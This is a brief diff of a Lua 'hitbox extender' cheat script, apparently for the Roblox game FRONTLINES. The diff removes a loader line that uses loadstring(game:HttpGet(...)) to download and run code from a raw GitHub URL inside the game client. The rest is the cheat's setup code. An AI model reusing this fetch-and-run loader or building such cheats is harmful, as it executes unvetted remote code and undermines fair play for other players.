@@ -1,10 +1,5 @@
 --FRONTLINES hitbox extender | mopsHub Sources
 
-local ac = nil
-ac = game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChildOfClass("Actor")
-if not (ac) then return error("[hitbox_extender error]: unable to find actor") end
-if (isparallel and not isparallel()) then return run_on_actor(ac, 'loadstring(game:HttpGet("https://raw.githubusercontent.com/xxxloilpxxx/lol/refs/heads/main/test.lua"))()') end
-
 if getgenv().__connection then getgenv().__connection:Disconnect() end
 
 _G.Hitbox_Extender_Settings = _G.Hitbox_Extender_Settings or {
